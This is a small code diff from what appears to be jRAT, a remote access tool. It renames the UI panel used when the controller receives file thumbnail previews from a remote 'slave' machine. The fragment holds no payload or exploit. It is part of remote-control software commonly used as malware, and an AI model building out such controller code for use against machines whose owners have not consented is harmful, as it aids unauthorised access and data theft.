@@ -3,7 +3,7 @@ package jrat.module.fs.packets;
 import jrat.common.utils.ImageUtils;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPacket;
-import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.PanelFileSystem;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -25,7 +25,7 @@ public class Packet59ThumbnailPreview implements IncomingPacket {
 		byte[] buffer = new byte[imageSize];
 		slave.getDataInputStream().readFully(buffer);
 
-		FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+		PanelFileSystem frame = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);
 
 		if (frame != null) {
 			BufferedImage img = ImageUtils.decodeImage(buffer);
